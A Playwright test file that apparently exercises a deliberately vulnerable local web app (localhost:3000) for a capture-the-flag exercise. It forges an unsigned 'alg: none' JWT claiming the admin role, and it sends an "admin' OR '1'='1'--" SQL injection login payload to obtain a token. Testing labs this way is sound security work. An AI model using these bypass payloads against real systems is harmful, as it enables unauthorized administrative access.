import { test, expect, APIRequestContext } from '@playwright/test';

const API_URL = 'http://localhost:3000/api';

test.describe('/api/admin (Broken Authentication)', () => {
  test('GET admin access with forged unsigned JWT', async ({ request }: { request: APIRequestContext }) => {
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64');
    const payload = Buffer.from(JSON.stringify({ 
      id: 999, 
      username: 'hacker', 
      role: 'admin' 
    })).toString('base64');
    
    const fakeToken = `${header}.${payload}.`;
    
    const response = await request.get(`${API_URL}/admin`, {
      headers: {
        'Authorization': `Bearer ${fakeToken}`
      }
    });
    
    const data = await response.json();
    
    if (response.ok()) {
      expect(data.message).toContain('Admin access granted');
      console.log('✓ Admin bypass successful with forged JWT!');
      console.log(`  Flag: ${data.flag}`);
    }
  });

  test('GET admin endpoint with decoded token shows weak verification', async ({ request }: { request: APIRequestContext }) => {
    // First get a real token via SQL injection
    const loginResponse = await request.post(`${API_URL}/login`, {
      data: {
        username: "admin' OR '1'='1'--",
        password: 'anything'
      }
    });
    
    const loginData = await loginResponse.json();
    
    if (loginData.success && loginData.token) {
      const parts = loginData.token.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      
      console.log('✓ Token payload decoded:', payload);
    }
  });
});
